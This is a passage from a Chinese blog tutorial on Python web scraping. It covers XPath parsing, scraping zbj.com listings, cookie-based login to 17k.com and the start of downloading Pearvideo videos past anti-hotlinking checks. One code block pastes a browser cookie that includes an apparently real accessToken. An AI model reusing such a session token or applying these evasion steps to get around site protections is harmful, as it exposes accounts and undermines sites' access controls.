class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.google.com&quot;</span>&gt;</span>⾕歌<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.sogou.com&quot;</span>&gt;</span>搜狗<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;feiji&quot;</span>&gt;</span>⻜机<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;dapao&quot;</span>&gt;</span>⼤炮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;huoche&quot;</span>&gt;</span>⽕⻋<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;job&quot;</span>&gt;</span>李嘉诚<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;common&quot;</span>&gt;</span>胡辣汤<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    注意xpath的顺序是从1开始的,[]表示索引:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">tree = etree.parse(<span class="string">&quot;a.html&quot;</span>)</span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html&#x27;)</span></span><br><span class="line">result = tree.xpath(<span class="string">&#x27;/html/body/ul/li[1]/a/text()&#x27;</span>)  <span class="comment"># 注意xpath的顺序是从1开始的,[]表示索引</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074058.jpg"                      alt="image-20220911225624129"                ></p><p>​    [@xxx=xxx]属性的筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">tree = etree.parse(<span class="string">&quot;a.html&quot;</span>)</span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html&#x27;)</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引</span></span><br><span class="line">result = tree.xpath(<span class="string">&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;</span>) <span class="comment"># [@xxx=xxx]属性的筛选</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074101.jpg"                      alt="image-20220911230512542"                ></p><p>​    从每一个li提取文字信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">tree = etree.parse(<span class="string">&quot;a.html&quot;</span>)</span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html&#x27;)</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;) # [@xxx=xxx]属性的筛选</span></span><br><span class="line">ol_li_list = tree.xpath(<span class="string">&quot;/html/body/ol/li&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> ol_li_list:</span><br><span class="line">    <span class="comment"># 从每一个li提取文字信息</span></span><br><span class="line">    result = li.xpath(<span class="string">&quot;./a/text()&quot;</span>)  <span class="comment"># 在li中继续寻找，相对查找</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074102.jpg"                      alt="image-20220911230539552"                ></p><p>​    在li中找到a标签里href里的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">tree = etree.parse(<span class="string">&quot;a.html&quot;</span>)</span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html&#x27;)</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;) # [@xxx=xxx]属性的筛选</span></span><br><span class="line">ol_li_list = tree.xpath(<span class="string">&quot;/html/body/ol/li&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> ol_li_list:</span><br><span class="line">    <span class="comment"># 从每一个li提取文字信息</span></span><br><span class="line">    result = li.xpath(<span class="string">&quot;./a/text()&quot;</span>)  <span class="comment"># 在li中继续寻找，相对查找</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    result2 = li.xpath(<span class="string">&quot;./a/@href&quot;</span>)  <span class="comment"># 在li中找到a标签里href里的值</span></span><br><span class="line">    <span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074103.jpg"                      alt="image-20220911230555882"                ></p><p>​    下面这种方式也可拿到，返回的事一个列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">tree = etree.parse(<span class="string">&quot;a.html&quot;</span>)</span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html&#x27;)</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;) # [@xxx=xxx]属性的筛选</span></span><br><span class="line">ol_li_list = tree.xpath(<span class="string">&quot;/html/body/ol/li&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> ol_li_list:</span><br><span class="line">    <span class="comment"># 从每一个li提取文字信息</span></span><br><span class="line">    result = li.xpath(<span class="string">&quot;./a/text()&quot;</span>)  <span class="comment"># 在li中继续寻找，相对查找</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    result2 = li.xpath(<span class="string">&quot;./a/@href&quot;</span>)  <span class="comment"># 在li中找到a标签里href里的值</span></span><br><span class="line">    <span class="built_in">print</span>(result2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tree.xpath(<span class="string">&quot;/html/body/ul/li/a/@href&quot;</span>))</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074106.jpg"                      alt="image-20220911230809799"                ></p><p>​    浏览器是可以直接获取xpath的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74107.jpg"                      alt="image-20220911231040763"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(tree.xpath(<span class="string">&#x27;/html/body/div[1]/text()&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074108.jpg"                      alt="image-20220911231240138"                ></p><h4 id="Xpath实战-猪八戒信息"><a href="#Xpath实战-猪八戒信息" class="headerlink" title="Xpath实战-猪八戒信息"></a>Xpath实战-猪八戒信息</h4><p>​    url：<a class="link"   href="https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1" >https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1<i class="fas fa-external-link-alt"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074110.jpg"                      alt="image-20220911232759037"                ></p><p>​    查看页面源代码发现在源代码里：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074111.jpg"                      alt="image-20220911233505695"                >    复制的xpath是这样的：/html/body/div[2]/div/div/div[2]/div/div[3]/div[4]/div[1]/div[3]，我们把最后一个删掉：/html/body/div[2]/div/div/div[2]/div/div[3]/div[4]/div[1]/div，即可获得所有的框。</p><p>​    这里我们碰到了一些小问题，我们从浏览器直接获得的xpath没办法获取到信息了，询问大佬得知，某些网站在静态获取的时候xpath和动态的时候不一样，可能通过js改变了某些结构，从而让我们获取不到信息。我们可以通过某些关键元素的特征然后一步一步获取信息。</p><p>​    就比如我们现在直接获取price的数值，写一个小程序看看能不能获取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析</span></span><br><span class="line">html = etree.HTML(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每一个div</span></span><br><span class="line">divs = html.xpath(<span class="string">&#x27;/html/body/div[2]/div/div/div[2]/div/div[3]/div[4]/div[1]/div&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> div <span class="keyword">in</span> divs:</span><br><span class="line">    price = div.xpath(<span class="string">&quot;./div/div[3]/div[1]/span/text()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(price)</span><br></pre></td></tr></table></figure><p>​    寄，但是换一种写法就可以了,所以不要局限于一种方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到页面源代码</span></span><br><span class="line"><span class="comment"># 提取和解析数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析</span></span><br><span class="line">html = etree.HTML(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每一个div</span></span><br><span class="line">divs = html.xpath(<span class="string">&quot;/html/body//div[@class=&#x27;service-card-wrap&#x27;]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> div <span class="keyword">in</span> divs:</span><br><span class="line">    price = div.xpath(<span class="string">&quot;.//div[@class=&#x27;price&#x27;]/span/text()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(price)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074113.jpg"                      alt="image-20220912013905069"                ></p><p>​    做一下数据处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到页面源代码</span></span><br><span class="line"><span class="comment"># 提取和解析数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析</span></span><br><span class="line">html = etree.HTML(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每一个div</span></span><br><span class="line">divs = html.xpath(<span class="string">&quot;/html/body//div[@class=&#x27;service-card-wrap&#x27;]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> div <span class="keyword">in</span> divs:</span><br><span class="line">    price = div.xpath(<span class="string">&quot;.//div[@class=&#x27;price&#x27;]/span/text()&quot;</span>)[<span class="number">0</span>].strip(<span class="string">&quot;￥&quot;</span>).strip(<span class="string">&quot;狂欢价：&quot;</span>).strip(<span class="string">&quot;¥&quot;</span>)</span><br><span class="line">    title = <span class="string">&quot;saas&quot;</span>.join(div.xpath(<span class="string">&quot;.//a[@target=&#x27;_blank&#x27;]/text()&quot;</span>))</span><br><span class="line">    com_name = div.xpath(<span class="string">&quot;.//div[@class=&#x27;shop-info text-overflow-line&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    high = div.xpath(<span class="string">&quot;.//div[@class=&#x27;shop-star&#x27;]/span[@class=&#x27;el-tooltip item&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(high)</span><br></pre></td></tr></table></figure><p>​    ok完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到页面源代码</span></span><br><span class="line"><span class="comment"># 提取和解析数据</span></span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析</span></span><br><span class="line">html = etree.HTML(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每一个div</span></span><br><span class="line">divs = html.xpath(<span class="string">&quot;/html/body//div[@class=&#x27;service-card-wrap&#x27;]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> div <span class="keyword">in</span> divs:</span><br><span class="line">    price = div.xpath(<span class="string">&quot;.//div[@class=&#x27;price&#x27;]/span/text()&quot;</span>)[<span class="number">0</span>].strip(<span class="string">&quot;￥&quot;</span>).strip(<span class="string">&quot;狂欢价：&quot;</span>).strip(<span class="string">&quot;¥&quot;</span>)</span><br><span class="line">    title = <span class="string">&quot;saas&quot;</span>.join(div.xpath(<span class="string">&quot;.//a[@target=&#x27;_blank&#x27;]/text()&quot;</span>))</span><br><span class="line">    com_name = div.xpath(<span class="string">&quot;.//div[@class=&#x27;shop-info text-overflow-line&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    high = div.xpath(<span class="string">&quot;.//div[@class=&#x27;shop-star&#x27;]/span[@class=&#x27;el-tooltip item&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>([<span class="string">&#x27;公司名称：&#x27;</span> + com_name] + [<span class="string">&#x27; 公司价格：&#x27;</span> + price] + [<span class="string">&#x27; 广告名称：&#x27;</span> + title] + [<span class="string">&#x27; 公司评分：&#x27;</span> + high])</span><br><span class="line"></span><br><span class="line">resp.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;over&quot;</span>)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074116.jpg"                      alt="image-20220912023007932"                ></p><hr><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><h4 id="requests进阶概述"><a href="#requests进阶概述" class="headerlink" title="requests进阶概述"></a>requests进阶概述</h4><p>​    我们在之前的爬⾍中其实已经使⽤过headers了. header为HTTP协 议中的请求头. ⼀般存放⼀些和请求内容⽆关的数据. 有时也会存放 ⼀些安全验证信息.⽐如常⻅的User-Agent, token, cookie等. </p><p>​    通过requests发送的请求, 我们可以把请求头信息放在headers中. 也 可以单独进⾏存放, 最终由requests⾃动帮我们拼接成完整的http请求头. </p><p>​    本章内容: </p><pre><code>1. 模拟浏览器登录-&gt;处理cookie 1. 防盗链处理-&gt; 抓取梨视频数据 1. 代理 -&gt; 防⽌被封IP </code></pre><p>​    综合训练: 抓取⽹易云⾳乐评论信息</p><h4 id="处理cookie登陆小说网"><a href="#处理cookie登陆小说网" class="headerlink" title="处理cookie登陆小说网"></a>处理cookie登陆小说网</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆 -&gt; 得到cookie</span></span><br><span class="line"><span class="comment"># 带着cookie去请求书架url -&gt; 书架上的内容</span></span><br><span class="line"><span class="comment"># 必须得把上面的两个操作连起来</span></span><br><span class="line"><span class="comment"># 用session进行请求 -&gt; session是一连串的请求，在这个过程中cookie不会丢失</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 会话</span></span><br><span class="line">session = requests.session()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;loginName&quot;</span>: <span class="string">&quot;13000000000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 1、登陆</span></span><br><span class="line">url = <span class="string">&quot;https://passport.17k.com/ck/user/login&quot;</span></span><br><span class="line">session.post(url, data=data)</span><br><span class="line"><span class="comment"># print(resp.text)</span></span><br><span class="line"><span class="comment"># print(resp.cookies)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、拿书架数据</span></span><br><span class="line">resp = session.get(<span class="string">&quot;https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br></pre></td></tr></table></figure><p>​    另一种写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆 -&gt; 得到cookie</span></span><br><span class="line"><span class="comment"># 带着cookie去请求书架url -&gt; 书架上的内容</span></span><br><span class="line"><span class="comment"># 必须得把上面的两个操作连起来</span></span><br><span class="line"><span class="comment"># 用session进行请求 -&gt; session是一连串的请求，在这个过程中cookie不会丢失</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 会话</span></span><br><span class="line">session = requests.session()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;loginName&quot;</span>: <span class="string">&quot;13000000000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 1、登陆</span></span><br><span class="line">url = <span class="string">&quot;https://passport.17k.com/ck/user/login&quot;</span></span><br><span class="line">session.post(url, data=data)</span><br><span class="line"><span class="comment"># print(resp.text)</span></span><br><span class="line"><span class="comment"># print(resp.cookies)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、拿书架数据</span></span><br><span class="line"><span class="comment"># resp = session.get(&quot;https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919&quot;)</span></span><br><span class="line"><span class="comment"># print(resp.json())</span></span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919&quot;</span>, headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;uuid=ECF94FC9-441F-C404-260F-38B5BA521427; c_channel=0; c_csc=web; GUID=9ee2ce7f-dbc3-40e9-93c2-05c4bdf51309; Hm_lvt_9793f42b498361373512340937deb2a0=1662986278; sajssdk_2015_cross_new_user=1; accessToken=avatarUrl%3Dhttps%253A%252F%252Fcdn.static.17k.com%252Fuser%252Favatar%252F13%252F93%252F12%252F98061293.jpg-88x88%253Fv%253D1662984766000%26id%3D98061293%26nickname%3D%25E4%25B9%25A6%25E5%258F%258B002Wc1197%26e%3D1678538408%26s%3Dca1b65e41bd3904f&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074117.jpg"                      alt="image-20220912212027861"                ></p><h4 id="防盗链抓取梨视频"><a href="#防盗链抓取梨视频" class="headerlink" title="防盗链抓取梨视频"></a>防盗链抓取梨视频</h4><p>​    我们抓一下梨视频的视频</p><p>​    首先我们可以看到，我们的当前页面源码和显示源码是不一样的，因为在页面源码里没有&lt;video&gt;这个标签，应该是碰到了和前面一样的js修改的情况。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074118.jpg"                      alt="image-20220912214102862"                ></p><p>​    重新加载页面然后看一下js</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074120.jpg"                      alt="image-20220912214247083"                ></p><p>​    发现了视频链接，然后直接访问404，寄</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074122.jpg"                      alt="image-20220912214338650"                ></p><p>​    对比一下这几个链接，发现是替换了几个部分。替换的部分从哪来呢</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074123.jpg"                      alt="image-20220912214617201"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074124.jpg"                      alt="image-20220912214858149"                ></p><p>​    还在文章的url也有</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074125.jpg"                      alt="image-20220912215213653"                >    </p><p>​    然后就可以开始写代码了</p><p>​    1、拿到contId</p><p>​    2、拿到videoStatus返回的json. -&gt; srcURL</p><p>​    3、srcURL里面的内容进行修整</p><p>​    4、下载视频</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、拿到contId</span></span><br><span class="line"><span class="comment"># 2、拿到videoStatus返回的json. -&gt; srcURL</span></span><br><span class="line"><span class="comment"># 3、srcURL里面的内容进行修整</span></span><br><span class="line"><span class="comment"># 4、下载视频</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.pearvideo.com/video_1168452&quot;</span></span><br><span class="line">contId = url.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">videoStatusUrl = <span class="string">f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=<span class="subst">&#123;contId&#125;</span>&amp;mrd=0.38022964971760365&quot;</span></span><br><span class="line">resp = 